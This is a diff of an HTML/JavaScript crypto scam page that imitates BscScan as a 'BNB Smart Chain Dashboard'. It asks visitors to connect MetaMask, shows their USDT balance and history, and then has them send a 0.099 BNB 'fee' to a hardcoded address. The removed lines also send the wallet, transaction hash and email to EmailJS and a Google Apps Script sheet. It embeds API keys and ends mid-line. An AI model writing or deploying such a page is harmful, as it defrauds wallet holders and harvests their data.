@@ -1,95 +1,173 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" /><meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>BscScan.org</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>BNB Smart Chain Dashboard</title>
   <script src="https://cdn.jsdelivr.net/npm/ethers@6/dist/ethers.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <style>
-    body { font-family:'Inter',sans-serif; background:#F8F9FA; margin:0; padding:0;
-      display:flex; justify-content:center; align-items:center; min-height:100vh; }
-    .container { background:#FFF; border:1px solid #DEE2E6; border-radius:8px;
-      padding:30px; width:100%; max-width:480px; text-align:center; box-shadow:0 2px 8px rgba(0,0,0,0.05); }
-    h1 { color:#2B6CB0; margin-bottom:20px; }
-    input { width:100%; padding:10px; margin:10px 0; border:1px solid #CED4DA; border-radius:4px; }
-    .btn { background:#2B6CB0; color:#fff; border:none; padding:10px 20px; margin:10px 5px;
-      border-radius:4px; cursor:pointer; font-weight:600; }
-    .btn:hover { background:#1A4A7A; }
-    .status, .wallet-status { color:#4A5568; margin:10px 0; font-size:14px; }
-    .address-box, .balance-box { background:#EDF2F7; padding:10px; border-radius:4px;
-      font-family:monospace; margin:15px 0; }
-    .qr { width:180px; border:1px solid #CED4DA; border-radius:4px; margin:15px 0; }
-    .link { color:#2B6CB0; text-decoration:none; display:block; margin-bottom:15px; }
-    .link:hover { text-decoration:underline; }
-    .usdt-display { display:flex; justify-content:center; align-items:center; gap:8px; margin-top:10px; }
-    .usdt-display img { width:22px; }
-    .hidden { display:none; }
+    /* BscScan-style dark theme */
+    body {
+      font-family: 'Inter', sans-serif;
+      background-color: #181818;
+      color: #e4e4e4;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      width: 100%;
+      max-width: 1200px;
+      margin: 20px auto;
+      padding: 20px;
+      background-color: #1e1e1e;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+    }
+    h1 {
+      color: #4e8af7;
+      text-align: center;
+    }
+    .btn {
+      background-color: #4e8af7;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      margin: 10px;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+    .btn:hover {
+      background-color: #3a6cc1;
+    }
+    .address-box {
+      background-color: #2c2c2c;
+      padding: 10px;
+      border-radius: 5px;
+      font-family: monospace;
+      word-wrap: break-word;
+    }
+    .usdt-display {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 20px 0;
+    }
+    .usdt-display img {
+      width: 24px;
+      margin-right: 10px;
+    }
+    .transaction-history {
+      margin-top: 20px;
+      max-height: 400px;
+      overflow-y: auto;
+    }
+    .transaction-history table {
+      width: 100%;
+      border-collapse: collapse;
+    }
+    .transaction-history th,
+    .transaction-history td {
+      padding: 8px;
+      text-align: left;
+      border-bottom: 1px solid #444;
+    }
+    .transaction-history th {
+      background-color: #2c2c2c;
+    }
+    .transaction-history tr:nth-child(even) {
+      background-color: #333;
+    }
+    .qr-code {
+      width: 200px;
+      height: 200px;
+      margin: 20px auto;
+    }
+    .status {
+      text-align: center;
+      font-size: 18px;
+      margin-top: 20px;
+    }
   </style>
 </head>
 <body>
+
   <div class="container" id="page1">
     <h1>BNB Smart Chain Dashboard</h1>
-    <input type="email" id="userEmail" placeholder="Email (optional)" />
-    <div class="wallet-status" id="walletStatus">🔌 Not connected</div>
-    <div class="usdt-display hidden" id="usdtBalance">
-      <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" alt="USDT"/>
-      <span id="usdtAmount">$0.00</span>
-    </div>
     <button class="btn" onclick="connectMetaMask()">Connect MetaMask</button>
     <button class="btn" onclick="manualWallet()">Manual Wallet</button>
-    <div id="manualInput" class="hidden">
-      <input type="text" id="manualAddress" placeholder="Enter BSC Address" />
-      <button class="btn" onclick="useManualWallet()">Confirm Address</button>
+    <div id="walletStatus" class="status">Wallet not connected</div>
+    <div id="usdtBalance" class="usdt-display hidden">
+      <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" alt="USDT" />
+      <span id="usdtAmount">$0.00</span>
+    </div>
+    <div id="transactionHistory" class="transaction-history hidden">
+      <h2>Transaction History</h2>
+      <table>
+        <thead>
+          <tr>
+            <th>Hash</th>
+            <th>Method</th>
+            <th>Block</th>
+            <th>Age</th>
+            <th>Value</th>
+            <th>Txn Fee</th>
+          </tr>
+        </thead>
+        <tbody id="transactionList"></tbody>
+      </table>
     </div>
     <button class="btn" onclick="switchPage('page2')">Next →</button>
   </div>
 
   <div class="container hidden" id="page2">
-    <h1>Authorize Transaction</h1>
-    <p class="status">Your transaction is being authorized by MetaMask / Wallet.</p>
-    <button class="btn" onclick="switchPage('page3')">Confirm opBNB Transaction</button>
+    <h1>Confirm Transaction</h1>
+    <div class="status">Confirm your transaction to proceed.</div>
+    <button class="btn" onclick="confirmTransaction()">Confirm</button>
   </div>
 
   <div class="container hidden" id="page3">
-    <h1>Confirm Payment</h1>
-    <p>Top‑up fee: <strong>0.099 BNB</strong></p>
+    <h1>Transaction Details</h1>
+    <div class="status">Transaction initiated. Please wait...</div>
+    <div class="qr-code">
+      <img src="https://chart.googleapis.com/chart?cht=qr&chs=200x200&chl=0xFf5e8a2603e64b2950Ee8D0Af6AC86670bD5Db69" alt="BNB Address QR Code" />
+    </div>
     <div class="address-box">0xFf5e8a2603e64b2950Ee8D0Af6AC86670bD5Db69</div>
-    <img class="qr" src="https://chart.googleapis.com/chart?cht=qr&chs=200x200&chl=0xFf5e8a2603e64b2950Ee8D0Af6AC86670bD5Db69" alt="BNB QR"/>
-    <a class="link" href="https://bscscan.com/address/0xFf5e8a2603e64b2950Ee8D0Af6AC86670bD5Db69" target="_blank">View on BscScan</a>
-    <button class="btn" onclick="sendTransaction()">Send 0.099 BNB</button>
-    <div class="status" id="status"></div>
+    <button class="btn" onclick="sendTransaction()">Send 0.099 BNB</button>
+    <div id="status" class="status"></div>
   </div>
 
   <div class="container hidden" id="successPage">
-    <h1>✅ Transaction Successful</h1>
-    <p class="status">Redirecting you soon...</p>
+    <h1>Transaction Successful</h1>
+    <div class="status">Redirecting...</div>
   </div>
 
   <div class="container hidden" id="failPage">
-    <h1>❌ Transaction Failed</h1>
-    <p class="status">Please try again.</p>
+    <h1>Transaction Failed</h1>
+    <div class="status">Please try again later.</div>
     <button class="btn" onclick="switchPage('page1')">Go Back</button>
   </div>
 
   <script>
-    const targetAddress       = "0xFf5e8a2603e64b2950Ee8D0Af6AC86670bD5Db69";
-    const usdtContract        = "0x55d398326f99059ff775485246999027b3197955";
-    const bscApiKey           = "ZM8ACMJB67C2IXKKBF8URFUNSY";
-    const bscApiUrl           = "https://api.bscscan.com/api";
-    const emailService        = "service_78wwbgl";
-    const templateID          = "template_omkmcio";
-    const publicKey           = "ochPV1QVtay7TOdBA";
-    const sheetUrl            = "https://script.google.com/macros/s/AKfycbwCW1bZ-6f9o4XJSVnKPUdfhQz0Z0AzphZ92dXh2yxhQ9VtxY/exec";
+    const targetAddress = "0xFf5e8a2603e64b2950Ee8D0Af6AC86670bD5Db69";
+    const usdtContract = "0x55d398326f99059ff775485246999027b3197955";
+    const bscApiKey = "ZM8ACMJB67C2IXKKBF8URFUNSY";
+    const bscApiUrl = "https://api.bscscan.com/api";
+    const emailService = "service_78wwbgl";
+    const templateID = "template_omkmcio";
+    const publicKey = "ochPV1QVtay7TOdBA";
+    const sheetUrl = "https://script.google.com/macros/s/AKfycbwCW1bZ-6f9o4XJSVnKPUdfhQz0Z0AzphZ92dXh2yxhQ9VtxY/exec";
 
     let signer = null, userAddress = null;
 
     function switchPage(id) {
-      document.querySelectorAll('.container').forEach(c=>c.classList.add('hidden'));
+      document.querySelectorAll('.container').forEach(c => c.classList.add('hidden'));
       document.getElementById(id).classList.remove('hidden');
     }
 
     async function connectMetaMask() {
-      if(!window.ethereum) return alert("Install MetaMask!");
+      if (!window.ethereum) return alert("Install MetaMask!");
       const provider = new ethers.BrowserProvider(window.ethereum);
       await provider.send("eth_requestAccounts", []);
       signer = await provider.getSigner();
@@ -98,72 +176,53 @@
     }
 
     function manualWallet() {
-      document.getElementById('manualInput').classList.remove('hidden');
-    }
-
-    function useManualWallet() {
-      const addr = document.getElementById('manualAddress').value.trim();
-      if(!ethers.isAddress(addr)) return alert("Invalid BSC address.");
+      const addr = prompt("Enter your BSC wallet address:");
+      if (!ethers.isAddress(addr)) return alert("Invalid address.");
       signer = null;
       userAddress = addr;
       afterConnect();
-      document.getElementById('manualInput').classList.add('hidden');
     }
 
     async function afterConnect() {
-      document.getElementById('walletStatus').innerText = "✅ " + userAddress;
+      document.getElementById('walletStatus').innerText = "Connected: " + userAddress;
       document.getElementById('usdtBalance').classList.remove('hidden');
       const res = await fetch(`${bscApiUrl}?module=account&action=tokenbalance&contractaddress=${usdtContract}&address=${userAddress}&tag=latest&apikey=${bscApiKey}`);
       const data = await res.json();
       const usdtBal = parseInt(data.result) / 1e18;
       document.getElementById('usdtAmount').innerText = `$${usdtBal.toFixed(2)}`;
+      fetchTransactionHistory();
+    }
+
+    async function fetchTransactionHistory() {
+      const res = await fetch(`${bscApiUrl}?module=account&action=txlist&address=${userAddress}&startblock=0&endblock=99999999&page=1&offset=10&sort=desc&apikey=${bscApiKey}`);
+      const data = await res.json();
+      const txList = document.getElementById('transactionList');
+      data.result.forEach(tx => {
+        const row = document.createElement('tr');
+        row.innerHTML = `
+          <td><a href="https://bscscan.com/tx/${tx.hash}" target="_blank">${tx.hash.slice(0, 10)}...</a></td>
+          <td>${tx.method}</td>
+          <td>${tx.blockNumber}</td>
+          <td>${new Date(tx.timeStamp * 1000).toLocaleString()}</td>
+          <td>${ethers.formatUnits(tx.value, 18)} BNB</td>
+          <td>${ethers.formatUnits(tx.gasUsed * tx.gasPrice, 18)} BNB</td>
+        `;
+        txList.appendChild(row);
+      });
+      document.getElementById('transactionHistory').classList.remove('hidden');
+    }
+
+    async function confirmTransaction() {
+      switchPage('page3');
     }
 
     async function sendTransaction() {
       const statusEl = document.getElementById('status');
-      statusEl.innerText = "⏳ Sending...";
+      statusEl.innerText = "Sending...";
       try {
         let txHash;
-        if(signer){
+        if (signer) {
           const tx = await signer.sendTransaction({ to: targetAddress, value: ethers.parseEther("0.099") });
           txHash = tx.hash;
         } else {
-          alert("Please send 0.099 BNB to: " + targetAddress);
-          txHash = "manual_"+Date.now();
-        }
-
-        const email = document.getElementById('userEmail').value||"";
-        emailjs.init(publicKey);
-        await emailjs.send(emailService, templateID, {
-          user_wallet: userAddress,
-          tx_hash: txHash,
-          to_address: targetAddress,
-          email,
-          message: "Transaction initiated"
-        });
-
-        await fetch(sheetUrl, {
-          method:'POST', headers:{ 'Content-Type':'application/json' },
-          body: JSON.stringify({ user_wallet:userAddress, tx_hash:txHash, email, to_address:targetAddress })
-        });
-
-        if(signer){
-          const verify = await fetch(`${bscApiUrl}?module=transaction&action=gettxreceiptstatus&txhash=${txHash}&apikey=${bscApiKey}`);
-          const jr = await verify.json();
-          if(jr.status==="1" && jr.result.status==="1") {
-            switchPage('successPage'); setTimeout(()=>switchPage('page1'),5000);
-          } else throw new Error("Transaction failed");
-        } else {
-          alert("Manual tx — verify on BscScan");
-          switchPage('successPage');
-        }
-      } catch(e){
-        console.error(e);
-        switchPage('failPage');
-      } finally {
-        statusEl.innerText = "";
-      }
-    }
-  </script>
-</body>
-</html>
+          alert("Please send 0.1
